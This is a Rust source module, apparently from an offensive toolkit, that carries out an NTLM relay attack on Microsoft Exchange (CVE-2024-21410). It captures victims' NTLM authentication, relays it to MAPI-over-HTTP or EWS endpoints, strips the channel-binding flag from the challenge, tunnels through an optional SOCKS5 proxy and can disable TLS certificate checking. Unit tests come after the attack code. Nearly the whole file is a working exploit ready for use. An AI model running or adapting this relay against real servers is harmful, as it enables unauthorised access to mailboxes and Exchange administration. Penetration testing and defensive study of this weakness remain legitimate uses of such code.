//! Exchange Relay Target (CVE-2024-21410) — NTLM relay to Microsoft Exchange.
//!
//! Relays captured NTLM authentication to Exchange MAPI-over-HTTP or EWS endpoints.
//! Pre-CU14 Exchange servers (and many unpatched post-CU14 servers) accept NTLM
//! authentication without Extended Protection for Authentication (EPA), enabling
//! relay of captured Net-NTLMv2 hashes to access mailboxes or perform Exchange
//! admin operations.

use crate::{RelayError, Result};
use base64::Engine;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio_rustls::TlsConnector;
use tokio_rustls::rustls::client::danger::{
    HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier,
};
use tokio_rustls::rustls::crypto::{
    CryptoProvider, aws_lc_rs::default_provider, verify_tls12_signature, verify_tls13_signature,
};
use tokio_rustls::rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use tokio_rustls::rustls::{ClientConfig, DigitallySignedStruct, RootCertStore, SignatureScheme};
use tracing::{debug, info, warn};

const IO_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);
const BUF: usize = 16_384;

trait ExchangeIo: AsyncRead + AsyncWrite + Unpin {}
impl<T> ExchangeIo for T where T: AsyncRead + AsyncWrite + Unpin {}

/// Configuration for Exchange NTLM relay.
#[derive(Debug, Clone)]
pub struct ExchangeRelayConfig {
    pub listen_ip: String,
    pub target_host: String,
    pub target_port: u16,
    pub use_tls: bool,
    pub accept_self_signed: bool,
    pub ews_path: String,
    pub mapi_path: String,
    pub prefer_mapi: bool,
    pub exchange_version: ExchangeVersion,
    /// Optional SOCKS5 proxy for outbound connections (format: `host:port`).
    pub socks5_proxy: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExchangeVersion {
    Exchange2013,
    Exchange2016,
    Exchange2019,
    ExchangeOnline,
    AutoDetect,
}

impl std::fmt::Display for ExchangeVersion {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Exchange2013 => write!(f, "Exchange 2013"),
            Self::Exchange2016 => write!(f, "Exchange 2016"),
            Self::Exchange2019 => write!(f, "Exchange 2019"),
            Self::ExchangeOnline => write!(f, "Exchange Online"),
            Self::AutoDetect => write!(f, "Auto-Detect"),
        }
    }
}

impl Default for ExchangeRelayConfig {
    fn default() -> Self {
        Self {
            listen_ip: "::".into(),
            target_host: "exchange.corp.local".into(),
            target_port: 443,
            use_tls: true,
            accept_self_signed: true,
            ews_path: "/EWS/Exchange.asmx".into(),
            mapi_path: "/mapi/".into(),
            prefer_mapi: true,
            exchange_version: ExchangeVersion::AutoDetect,
            socks5_proxy: None,
        }
    }
}

pub struct ExchangeRelay {
    config: ExchangeRelayConfig,
    running: Arc<AtomicBool>,
    tasks: Vec<tokio::task::JoinHandle<()>>,
}

impl ExchangeRelay {
    pub fn new(config: ExchangeRelayConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            tasks: Vec::new(),
        }
    }

    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("Exchange relay already running".into()).into());
        }
        self.running.store(true, Ordering::SeqCst);

        let listen_addr = crate::utils::format_addr(&self.config.listen_ip, 80);
        let listener = TcpListener::bind(&listen_addr)
            .await
            .map_err(|e| RelayError::Network(format!("Bind failed: {e}")))?;
        info!(
            "Exchange relay listening on {listen_addr} -> {}:{} (CVE-2024-21410)",
            self.config.target_host, self.config.target_port
        );

        let running = self.running.clone();
        let config = self.config.clone();

        let handle = tokio::spawn(async move {
            loop {
                if !running.load(Ordering::SeqCst) {
                    break;
                }
                match listener.accept().await {
                    Ok((stream, addr)) => {
                        debug!("Exchange relay: connection from {addr}");
                        let cfg = config.clone();
                        tokio::spawn(async move {
                            if let Err(e) = handle_exchange_relay(stream, &cfg).await {
                                debug!("Exchange relay error: {e}");
                            }
                        });
                    }
                    Err(e) => {
                        warn!("Exchange relay accept error: {e}");
                        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                    }
                }
            }
        });

        self.tasks.push(handle);
        Ok(())
    }

    pub async fn stop(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        for handle in self.tasks.drain(..) {
            handle.abort();
        }
    }
}

async fn handle_exchange_relay(
    mut victim_stream: TcpStream,
    config: &ExchangeRelayConfig,
) -> Result<()> {
    let mut buf = vec![0u8; BUF];
    let n = tokio::time::timeout(IO_TIMEOUT, victim_stream.read(&mut buf))
        .await
        .map_err(|e| RelayError::Network(format!("Read timeout: {e}")))?
        .map_err(|e| RelayError::Network(format!("Read error: {e}")))?;

    let victim_request = &buf[..n];
    let victim_body = std::str::from_utf8(victim_request).unwrap_or("");

    let ntlm_negotiate = extract_ntlm_from_http(victim_body)
        .ok_or_else(|| RelayError::Protocol("No NTLM negotiate in victim request".into()))?;

    let paths: &[&str] = if config.prefer_mapi {
        &[&config.mapi_path, &config.ews_path]
    } else {
        &[&config.ews_path, &config.mapi_path]
    };

    let exchange_addr = format!("{}:{}", config.target_host, config.target_port);
    info!(
        "Connecting to Exchange at {exchange_addr} over {}",
        if config.use_tls { "TLS" } else { "TCP" }
    );

    for (attempt, path) in paths.iter().enumerate() {
        let mut exchange_stream = connect_exchange_stream(config).await?;

        info!("Exchange relay attempt {}: path={}", attempt + 1, path);

        let negotiate_payload =
            build_exchange_http_request(path, &config.target_host, &ntlm_negotiate);
        exchange_stream
            .write_all(&negotiate_payload)
            .await
            .map_err(|e| RelayError::Network(format!("Write to Exchange failed: {e}")))?;

        let mut ex_buf = vec![0u8; BUF];
        let n = tokio::time::timeout(IO_TIMEOUT, exchange_stream.read(&mut ex_buf))
            .await
            .map_err(|e| RelayError::Network(format!("Exchange read timeout: {e}")))?
            .map_err(|e| RelayError::Network(format!("Exchange read error: {e}")))?;

        let ex_response = &ex_buf[..n];
        let ex_body = std::str::from_utf8(ex_response).unwrap_or("");

        let ntlm_challenge = extract_ntlm_from_http(ex_body)
            .ok_or_else(|| RelayError::Protocol("No NTLM challenge from Exchange".into()))?;

        let modified_challenge = strip_channel_bindings(&ntlm_challenge);

        let http_challenge = format!(
            "HTTP/1.1 401 Unauthorized\r\n\
             WWW-Authenticate: NTLM {}\r\n\
             Content-Length: 0\r\n\
             Connection: keep-alive\r\n\
             \r\n",
            base64::engine::general_purpose::STANDARD.encode(&modified_challenge)
        );
        victim_stream
            .write_all(http_challenge.as_bytes())
            .await
            .map_err(|e| RelayError::Network(format!("Write to victim failed: {e}")))?;

        let n = tokio::time::timeout(IO_TIMEOUT, victim_stream.read(&mut buf))
            .await
            .map_err(|e| RelayError::Network(format!("Victim read timeout: {e}")))?
            .map_err(|e| RelayError::Network(format!("Victim read error: {e}")))?;

        let victim_auth = &buf[..n];
        let victim_auth_body = std::str::from_utf8(victim_auth).unwrap_or("");

        let ntlm_authenticate = extract_ntlm_from_http(victim_auth_body)
            .ok_or_else(|| RelayError::Protocol("No NTLM authenticate from victim".into()))?;

        let authenticate_payload =
            build_exchange_http_request(path, &config.target_host, &ntlm_authenticate);
        exchange_stream
            .write_all(&authenticate_payload)
            .await
            .map_err(|e| RelayError::Network(format!("Exchange auth write failed: {e}")))?;

        let n = tokio::time::timeout(IO_TIMEOUT, exchange_stream.read(&mut ex_buf))
            .await
            .map_err(|e| RelayError::Network(format!("Exchange final read timeout: {e}")))?
            .map_err(|e| RelayError::Network(format!("Exchange final read error: {e}")))?;

        let final_response = &ex_buf[..n];
        let response_str = std::str::from_utf8(final_response).unwrap_or("");
        let auth_success = response_str.contains("200 OK") || response_str.contains("202 Accepted");

        if auth_success {
            info!(
                "Exchange relay succeeded on {} — authenticated to {}",
                path, config.target_host
            );

            victim_stream
                .write_all(final_response)
                .await
                .map_err(|e| RelayError::Network(format!("Forward to victim failed: {e}")))?;

            return Ok(());
        }

        if attempt == paths.len() - 1 {
            warn!(
                "Exchange relay failed on all paths — auth rejected by {}",
                config.target_host
            );

            victim_stream
                .write_all(final_response)
                .await
                .map_err(|e| RelayError::Network(format!("Forward to victim failed: {e}")))?;

            return Err(RelayError::Protocol("Exchange auth rejected on all paths".into()).into());
        }

        info!("MAPI path failed, falling back to EWS...");
    }

    Ok(())
}

async fn connect_exchange_stream(
    config: &ExchangeRelayConfig,
) -> Result<Box<dyn ExchangeIo + Send>> {
    let target: std::net::SocketAddr = format!(
        "{}:{}",
        config.target_host, config.target_port
    )
    .parse()
    .map_err(|e| RelayError::Config(format!("Invalid Exchange target address: {e}")))?;
    let tcp = crate::utils::socks5_connect(target, IO_TIMEOUT, config.socks5_proxy.as_deref())
        .await
        .map_err(|e| RelayError::Network(format!("Exchange connect failed: {e}")))?;

    if !config.use_tls {
        return Ok(Box::new(tcp));
    }

    let client_config = build_tls_client_config(config.accept_self_signed);
    let connector = TlsConnector::from(Arc::new(client_config));
    let server_name = ServerName::try_from(config.target_host.clone())
        .map_err(|e| RelayError::Config(format!("Invalid Exchange TLS server name: {e}")))?;
    let tls = connector
        .connect(server_name, tcp)
        .await
        .map_err(|e| RelayError::Network(format!("Exchange TLS handshake failed: {e}")))?;

    Ok(Box::new(tls))
}

fn build_tls_client_config(accept_self_signed: bool) -> ClientConfig {
    let mut root_store = RootCertStore::empty();
    let native_certs = rustls_native_certs::load_native_certs();
    for cert in native_certs.certs {
        let _ = root_store.add(cert);
    }

    let mut config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    if accept_self_signed {
        config
            .dangerous()
            .set_certificate_verifier(Arc::new(NoCertificateVerification::default()));
    }

    config
}

#[derive(Debug)]
struct NoCertificateVerification(CryptoProvider);

impl Default for NoCertificateVerification {
    fn default() -> Self {
        Self(default_provider())
    }
}

impl ServerCertVerifier for NoCertificateVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> std::result::Result<ServerCertVerified, tokio_rustls::rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &CertificateDer<'_>,
        dss: &DigitallySignedStruct,
    ) -> std::result::Result<HandshakeSignatureValid, tokio_rustls::rustls::Error> {
        verify_tls12_signature(
            message,
            cert,
            dss,
            &self.0.signature_verification_algorithms,
        )
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &CertificateDer<'_>,
        dss: &DigitallySignedStruct,
    ) -> std::result::Result<HandshakeSignatureValid, tokio_rustls::rustls::Error> {
        verify_tls13_signature(
            message,
            cert,
            dss,
            &self.0.signature_verification_algorithms,
        )
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        self.0.signature_verification_algorithms.supported_schemes()
    }
}

fn build_exchange_http_request(path: &str, host: &str, ntlm_blob: &[u8]) -> Vec<u8> {
    let b64 = base64::engine::general_purpose::STANDARD.encode(ntlm_blob);
    format!(
        "POST {} HTTP/1.1\r\n\
         Host: {}\r\n\
         Content-Type: application/vnd.ms-outlook\r\n\
         Authorization: NTLM {}\r\n\
         Content-Length: 0\r\n\
         Connection: keep-alive\r\n\
         \r\n",
        path, host, b64
    )
    .into_bytes()
}

fn extract_ntlm_from_http(body: &str) -> Option<Vec<u8>> {
    for line in body.lines() {
        if (line.to_uppercase().contains("WWW-AUTHENTICATE: NTLM ")
            || line.to_uppercase().contains("AUTHORIZATION: NTLM "))
            && let Some(b64_part) = line.split("NTLM ").nth(1)
        {
            return base64::engine::general_purpose::STANDARD
                .decode(b64_part.trim())
                .ok();
        }
    }
    if let Some(b64_start) = body.find("NTLM ") {
        let after = &body[b64_start + 5..];
        if let Some(end) = after.find(['\r', '\n']) {
            return base64::engine::general_purpose::STANDARD
                .decode(after[..end].trim())
                .ok();
        }
    }
    None
}

fn strip_channel_bindings(challenge: &[u8]) -> Vec<u8> {
    if challenge.len() < 32 {
        return challenge.to_vec();
    }
    const NTLMSSP_NEGOTIATE_CHANNEL_BINDING: u32 = 0x40000000;
    let mut modified = challenge.to_vec();
    if modified.len() >= 24 {
        let flags = u32::from_le_bytes([modified[20], modified[21], modified[22], modified[23]]);
        let new_flags = flags & !NTLMSSP_NEGOTIATE_CHANNEL_BINDING;
        modified[20..24].copy_from_slice(&new_flags.to_le_bytes());
    }
    modified
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_exchange_config_default() {
        let cfg = ExchangeRelayConfig::default();
        assert_eq!(cfg.target_host, "exchange.corp.local");
        assert_eq!(cfg.target_port, 443);
    }

    #[test]
    fn test_ntlm_extraction() {
        let body = "GET / HTTP/1.1\r\nAuthorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=\r\nHost: test\r\n";
        let result = extract_ntlm_from_http(body);
        assert!(result.is_some());
        let decoded = result.unwrap();
        assert!(decoded.starts_with(b"NTLMSSP"));
    }

    #[test]
    fn test_www_authenticate_extraction() {
        let body = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=\r\nContent-Length: 0\r\n";
        let result = extract_ntlm_from_http(body);
        assert!(result.is_some());
        let decoded = result.unwrap();
        assert!(decoded.starts_with(b"NTLMSSP"));
    }

    #[test]
    fn test_channel_binding_stripping() {
        let mut challenge = vec![0u8; 32];
        challenge[20..24].copy_from_slice(&0x40000000u32.to_le_bytes());
        let stripped = strip_channel_bindings(&challenge);
        let flags = u32::from_le_bytes([stripped[20], stripped[21], stripped[22], stripped[23]]);
        assert_eq!(flags & 0x40000000, 0);
    }

    #[test]
    fn test_build_http_request() {
        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00";
        let req = build_exchange_http_request("/mapi/", "exchange.corp.local", ntlm);
        let req_str = String::from_utf8_lossy(&req);
        assert!(req_str.contains("/mapi/"));
        assert!(req_str.contains("Host: exchange.corp.local"));
        assert!(req_str.contains("Authorization: NTLM"));
    }

    #[test]
    fn test_exchange_version_display() {
        assert_eq!(ExchangeVersion::Exchange2019.to_string(), "Exchange 2019");
        assert_eq!(ExchangeVersion::AutoDetect.to_string(), "Auto-Detect");
    }
}
